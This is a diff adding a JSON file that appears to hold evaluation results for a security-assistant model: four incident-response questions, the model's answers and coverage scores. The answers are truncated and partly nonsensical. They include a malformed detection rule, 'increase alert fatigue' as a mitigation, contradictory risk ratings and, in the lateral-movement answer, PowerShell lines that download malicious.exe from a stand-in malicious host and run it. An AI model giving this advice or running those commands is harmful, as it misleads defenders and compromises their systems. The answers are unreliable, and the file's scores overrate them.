@@ -1,0 +1,90 @@
+[
+  {
+    "test_case": {
+      "type": "malware_analysis",
+      "question": "I found a suspicious executable making network connections. How should I analyze this potential malware?",
+      "expected_topics": [
+        "sandbox",
+        "static analysis",
+        "network analysis",
+        "indicators"
+      ]
+    },
+    "response": "**Immediate Response Actions:**\n1. **Terminate**: Shut down the system and remove malicious files.\n2. **Isolate**: Contain the endpoint and block malicious IPs.\n3. **Analysis**: Submit to EDR and run antivirus scans.\n4. **Report**: Document findings and share with stakeholders.\n**Detection Rules:** ```spl index=security sourcetype=misc:execution | eval technique_id=\"T1059.001\" | where command_line=\"sc.exe queryexact service_name\" OR command_line=\"reg.exe query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" | eval severity=\"High\" | where severity=\"High\" | eval action=\"ISOLATE+REPORT\" | eval confidence=\"Low",
+    "evaluation": {
+      "coverage_score": 0.5,
+      "found_topics": [
+        "static analysis",
+        "network analysis"
+      ],
+      "length": 68,
+      "has_actionable_advice": true
+    }
+  },
+  {
+    "test_case": {
+      "type": "incident_response",
+      "question": "We detected multiple failed login attempts from the same IP. What SOAR actions should we take?",
+      "expected_topics": [
+        "account lockdown",
+        "IP blocking",
+        "investigation",
+        "monitoring"
+      ]
+    },
+    "response": "**SECURITY RESPONSE**\n**IMMEDIATE:** Block source IP at perimeter\n**MONITORING:** Enable anomaly detection for this source\n**NOTIFICATION:** Alert stakeholders and legal team\n**RECOVERY:** Reset all passwords and force MFA\n**MITRE:** T1110\n**K8s Manifest:** N/A\n**Docker Command:** N/A\n**Validation Steps:**\n1. Verify source IP detection in SIEM\n2. Confirm detection in NGFW/WAF logs\n3. Check for false positives with similar patterns\n**Mitigation Steps:**\n1. Enable MFA for all accounts\n2. Implement password rotation\n3. Increase alert fatigue\n**Evidence:** N/A\n**References:",
+    "evaluation": {
+      "coverage_score": 0.75,
+      "found_topics": [
+        "account lockdown",
+        "IP blocking",
+        "monitoring"
+      ],
+      "length": 78,
+      "has_actionable_advice": true
+    }
+  },
+  {
+    "test_case": {
+      "type": "threat_hunting",
+      "question": "How can I hunt for lateral movement in our network after a potential compromise?",
+      "expected_topics": [
+        "network logs",
+        "authentication events",
+        "process monitoring",
+        "indicators"
+      ]
+    },
+    "response": "**LATERAL MOVEMENT HUNTING STRATEGY**\n\n\ud83d\udd0d **Scope**: Limit to host(s) with highest privilege\n\ud83d\udc64 **Permissions**: Check user accounts with unique privileges\n\ud83d\udcbb **Execution**: Execute commands remotely with privileged tools\n\ud83d\udcc8 **Timing**: Hunt during peak activity windows\n\ud83d\udcf0 **Reporting**: Compile results in a comprehensive report\n\n**COMMANDS TO EXECUTE:**\n```powershell\n# Remote File Inclusion (RFI)\nInvoke-WebRequest http://malicious-site.com/malicious.exe -OutFile c:\\temp\\malicious.exe\n# Command Injection (CLI)\nStart-Process -FilePath c:\\temp\\malicious.exe -ArgumentList \"command to execute\"\n# PowerShell Encoded",
+    "evaluation": {
+      "coverage_score": 0.25,
+      "found_topics": [
+        "process monitoring"
+      ],
+      "length": 70,
+      "has_actionable_advice": false
+    }
+  },
+  {
+    "test_case": {
+      "type": "vulnerability_response",
+      "question": "A critical vulnerability was discovered in our web servers. What's the SOAR response plan?",
+      "expected_topics": [
+        "patching",
+        "isolation",
+        "assessment",
+        "communication"
+      ]
+    },
+    "response": "**SOAR Response Plan: Web Vulnerability** **Risk Assessment:** Low to Medium **ETA:** 24 minutes **Severity:** Critical **ETA for remediation:** 12 minutes **ETA for detection:** 4 minutes **Implementation Steps:** 1. **Identify** vulnerable packages 2. **Isolate** affected hosts 3. **Patch** vulnerable packages 4. **Verify** remediation success **Validation Steps:** 1. **Check** for re-vulnerability 2. **Verify** NMAP detection results 3. **Confirm** remediation persistence **Evidence Gathering:** - Network scans - Library analysis - System logs **Mitigation:** Application isolation and patch management **Containment:** Immediate host isolation - Network segment",
+    "evaluation": {
+      "coverage_score": 0.5,
+      "found_topics": [
+        "isolation",
+        "assessment"
+      ],
+      "length": 82,
+      "has_actionable_advice": true
+    }
+  }
+]
